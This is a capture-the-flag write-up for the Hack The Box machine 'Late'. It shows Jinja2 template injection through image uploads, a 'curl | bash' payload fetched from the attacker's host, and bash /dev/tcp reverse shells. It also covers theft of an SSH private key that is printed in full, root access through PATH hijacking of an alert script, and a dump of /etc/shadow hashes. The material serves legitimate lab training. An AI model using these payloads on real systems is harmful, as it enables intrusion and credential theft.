# Late HTB | 0xwerz | 03/02/22

### Official [box page](https://app.hackthebox.com/machines/late) on HTB

<p align="center">
<img src="./img/Late.png" alt="pandora poster" width="800"/>
</p>

### Writeup:

#### System Scan | **IP: 10.10.11.146**

let's add the ip to to the `/etc/hosts` file with the default hostname`late.htb`

> `echo '10.10.11.156    late.htb ' >> /etc/hosts`

Fireup a typical nmap scan | **-sC** for default set of scripts. | **-sV** for version detection | **-T4** for traffic speed.

> `nmap -sC -sV -T4 10.10.11.156`

```
nmap -sC -sV -T4 10.10.11.156            ✔  01:29:18 PM 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-03 13:29 CET
Nmap scan report for late.htb (10.10.11.156)
Host is up (0.55s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.04 seconds
```

#### Open Ports

| Ports | Service | Takeaways     |
| ----- | ------- | ------------- |
| 22    | SSH     | OpenSSH 7.6p1 |
| 80    | HTTP    | nginx 1.14.0  |

#### Enumeration | Web page

we'll do some manual enumeration for the web page. you'll see a href link aims to `http://images.late.htb/`:

![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/images_href.png)  

add it to the hosts file also

> `echo '10.10.11.156 images.late.htb ' >> /etc/hosts`

It appears to be a image to text converter It is also indicated that the Flask
framework is used to do the conversions:

![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/images_page_header.png)

I'll give it a try, so i'll screenshot a text for for example this image:

![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/Hello-world.png)

we'll get as a response a txt file`results.txt`:

```bash
[werz@ctf01 results]$ cat results.txt 
<p>Hello world
</p>
[werz@ctf01 results]$
```

Since this is a flask application so it might be vulnerable to a Server Side Template Injection, let's figure it out.

Flask use the template engine [Jinja2]([Jinja &#8212; Jinja Documentation (3.1.x)](https://jinja.palletsprojects.com/en/3.1.x/)) by default, so that is what we'll be basing our payloads on.

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) has a various payloads for this such type. I'll upload a typical payload like `{{ 7*7 }}` as a image to check it out:

![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/7*7.png)

checking the `results.txt` file:

```bash
[werz@ctf01 results]$ cat results_2.txt 
<p>49
</p>[
werz@Arch results]$
```

So yeah! it seems work fine, we need to manage to get a reverse shell now [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

I'll use this type of payload:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

Setup a bash reverse shell, I'll give it `index.html` name to get it mapped by the first endpoint `/` with the http python server:

```bash
echo "bash -i >& /dev/tcp/10.10.16.8/9001 0>&1" > rev
[werz@ctf01 www]$ cat rev
bash -i >& /dev/tcp/10.10.16.8/9001 0>&1
```

Then start a python server:

```bash
[werz@Arch www]$ sudo python3 -m http.server 80
[sudo] password for werz: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```python
{{ cycler.__init__.__globals__.os.popen('curl 10.10.16.8 | bash').read() }}

```

the image should look like this, white background black font helps:

![](/home/werz/Desktop/ctf/htb/writeup/CTF-writeups/HTB/Machines/late/img/rev_pay.png)

and we have a shell!

```bash
[werz@ctf01 www]$ nc -lvnp 9001
Connection from 10.10.11.156:35182
bash: cannot set terminal process group (1129): Inappropriate ioctl for device
bash: no job control in this shell
svc_acc@late:~/app$ 
```

I'll grab the ssh keys to get a nice shell:

```bash
svc_acc@late:~/app$ cat ~/.ssh/id_rsa
cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
svc_acc@late:~/app$ 
```

copy it into a file and connect:

```bash
[werz@ctf01 user]$ echo "-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----" > id_rsa
[werz@ctf01 user]$ chmod 600 id_rsa 
[werz@ctf01 user]$ ssh -i id_rsa svc_acc@late.htb
```

After connecting if we check the `/usr/local/sbin` directory we notice a file `ssh-alert.sh` ( linpeas says it also ) that looks interesting we own it also by **svc_acc** user.

```bash
svc_acc@late:/usr/local/sbin$ cat ssh-alet.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

The script looks to give out an alert to the root user whenever someone logs in with SSH,
Let's upload [Pspy](https://github.com/DominicBreuker/pspy) to the monitor it in order to check how the script is run.
we can simlpy upload it using scp .

>  [werz@ctf01 user]$ scp -i id_rsa www/pspy32s svc_acc@late.htb:/tmp

so yeah the script runs as root **UID=0** when a ssh connection made.

```bash
2022/08/03 13:50:13 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/08/03 13:50:43 CMD: UID=0    PID=29921  | /usr/sbin/sshd -D -R 
2022/08/03 13:50:43 CMD: UID=110  PID=29922  | sshd: [net]          
2022/08/03 13:50:49 CMD: UID=0    PID=29923  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/08/03 13:50:49 CMD: UID=0    PID=29927  | /usr/sbin/sendmail root@late.htb 
2022/08/03 13:50:49 CMD: UID=???  PID=29926  | ???
2022/08/03 13:50:49 CMD: UID=0    PID=29928  | sendmail: MTA: 273DonSW029928 localhost.localdomain [127.0.0.1]: DATA
2022/08/03 13:50:49 CMD: UID=0    PID=29930  | sensible-mda svc_acc@new root  127.0.0.1 
2022/08/03 13:50:49 CMD: UID=0    PID=29929  | sendmail: MTA: ./273DonSW029928 from queue     
2022/08/03 13:50:49 CMD: UID=1000 PID=29931  | sshd: svc_acc        
```

Since the script is being run as root we could potentially gain privileged access to the system by modifying it, with that we have the write permission to the file:

```bash
svc_acc@late:/usr/local/sbin$ ls -l ssh-alert.sh 
-rwxr-xr-x 1 svc_acc svc_acc 433 Aug  3 07:50 ssh-alert.sh
```

but if we attempt to modify to the file using vim or something it rejects:

```bash
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

bash -i >& /dev/tcp/10.10.16.8/9002 0>&1
"ssh-alert.sh"
"ssh-alert.sh" E212: Can't open file for writing
Press ENTER or type command to continue
```

In addition to file permissions, Unix systems use file attributes. These can be used to further lock down permissions. Let's list the attributes of this specific file with `lsattr` command

```bash
svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh
----ia--------e--- ssh-alert.sh
```

The attribute **a** stands for append only , which only allows users to append to a file.

So let's do it with **curl**:

```bash
svc_acc@late:/usr/local/sbin$ echo "curl 10.10.16.8 | bash" >> ssh-alert.sh 
-bash: ssh-alert.sh: Operation not permitted
```

So it fails for some reasons. checking the content of `ssh-alert.sh` file again we found that `data` and  `uname` commands are not used with their absolute path (full path). If any command is not used with its absolute path in any bash script, then it creates PATH hijacking vulnerability which often leads to privilege escalation. [more...](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

```bash
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date` ## date command without a absolute path
        Server:      `uname -a` ## uname command without a absolute path
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

if we check the PATH environment variable:

```bash
svc_acc@late:/usr/local/sbin$ echo $PATH
/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

So it's clear enough now, I'll hijack the `date` command as follows:

```bash
svc_acc@late:/usr/local/sbin$ echo 'bash -i >& /dev/tcp/10.10.16.8/9002 0>&1' > date
```

then give it the executable permission:

```bash
svc_acc@late:/usr/local/sbin$ chmod +x date 
```

setup a nc listener:

```bash
[werz@Arch root]$ nc -lvnp 9002
```

then logout from the ssh session:

```bash
svc_acc@late:/usr/local/sbin$ exit
logout
Connection to late.htb closed.
[werz@Arch user]$ 
```

and we got a root reverse shell hit back!

```bash
[werz@Arch root]$ nc -lvnp 9002
Connection from 10.10.11.156:42138
bash: cannot set terminal process group (27748): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# cat /etc/shadow  
cat /etc/shadow
root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl/aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18997:0:99999:7:::
svc_acc:$6$/WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9/MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7:::
rtkit:*:18997:0:99999:7:::
usbmux:*:18997:0:99999:7:::
avahi:*:18997:0:99999:7:::
cups-pk-helper:*:18997:0:99999:7:::
saned:*:18997:0:99999:7:::
colord:*:18997:0:99999:7:::
pulse:*:18997:0:99999:7:::
geoclue:*:18997:0:99999:7:::
smmta:*:19006:0:99999:7:::
smmsp:*:19006:0:99999:7:::
root@late:/# 
```
